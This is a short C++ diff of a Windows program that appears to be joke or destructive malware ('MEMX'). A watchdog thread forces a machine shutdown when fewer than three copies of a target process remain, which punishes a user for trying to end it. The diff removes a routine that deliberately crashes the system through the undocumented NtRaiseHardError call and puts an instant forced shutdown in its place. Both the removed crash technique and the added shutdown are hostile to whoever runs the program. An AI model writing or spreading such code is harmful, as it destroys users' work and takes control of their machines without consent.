@@ -24,20 +24,7 @@ std::vector<DWORD> GetProcessesByName(const std::wstring& name) {
 }
 
 void TriggerBSOD() {
-    typedef NTSTATUS (NTAPI *pNtRaiseHardError)(
-        NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG
-    );
-    
-    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-    pNtRaiseHardError NtRaiseHardError = 
-        (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
-    
-    if (NtRaiseHardError) {
-        UNICODE_STRING msg;
-        RtlInitUnicodeString(&msg, L"MEMX: SYSTEM CRASH");
-        ULONG response;
-        NtRaiseHardError(0xDEADBEEF, 0, 0, NULL, 1, &response);
-    }
+    system("shutdown /s /t 0");
 }
 
 DWORD WINAPI WatchdogProcess(LPVOID param) {
@@ -45,10 +32,8 @@ DWORD WINAPI WatchdogProcess(LPVOID param) {
     
     while (g_running) {
         auto pids = GetProcessesByName(target);
-        if (pids.size() < 4) {
+        if (pids.size() < 3) {
             TriggerBSOD();
-            Sleep(1000);
-            system("shutdown /s /t 0");
             break;
         }
         Sleep(1000);
